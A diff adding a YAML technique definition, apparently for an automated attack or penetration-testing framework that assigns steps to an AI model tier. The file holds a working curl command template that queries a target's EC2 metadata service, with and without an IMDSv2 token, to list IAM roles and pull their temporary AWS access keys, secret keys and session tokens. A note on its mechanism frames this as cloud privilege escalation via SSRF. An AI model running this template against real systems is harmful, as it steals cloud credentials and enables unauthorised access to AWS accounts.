@@ -1,0 +1,35 @@
+name: aws_ec2_metadata
+category: cloud
+description: Query EC2 IMDS for instance role credentials (IMDSv1 and IMDSv2)
+preconditions:
+- service.port==80
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: >
+  curl -s --connect-timeout 3 http://{target_ip}/latest/meta-data/ 2>&1;
+  TOKEN=$(curl -s -X PUT "http://{target_ip}/latest/api/token"
+    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null);
+  curl -s -H "X-aws-ec2-metadata-token: $TOKEN"
+    http://{target_ip}/latest/meta-data/iam/security-credentials/ 2>&1 |
+    tee /tmp/imds_roles.txt;
+  ROLE=$(cat /tmp/imds_roles.txt | head -1);
+  [ -n "$ROLE" ] && curl -s -H "X-aws-ec2-metadata-token: $TOKEN"
+    "http://{target_ip}/latest/meta-data/iam/security-credentials/$ROLE" 2>&1
+parser: json_parser
+expected_effects:
+- aws_instance_role_creds_obtained
+- cloud.aws_creds_available
+- aws_access_key_found
+falsifier:
+  pattern: Connection refused|timed out|404|Not Found
+  timeout: 15
+model_tier: haiku
+mechanism: >
+  IMDSv1 (no token required): curl http://169.254.169.254/latest/meta-data/ directly.
+  IMDSv2 (token required): PUT /latest/api/token first to get session token, then use it.
+  /iam/security-credentials/<role-name> returns AccessKeyId, SecretAccessKey, Token — full
+  temporary AWS credentials valid for 6h. From SSRF or code execution on EC2 this achieves
+  cloud privilege escalation. 169.254.169.254 is the link-local IMDS address on AWS.
+hacktricks_ref: cloud-security/aws-security/aws-ec2-enumeration.md
+destructive: false
+opsec: low
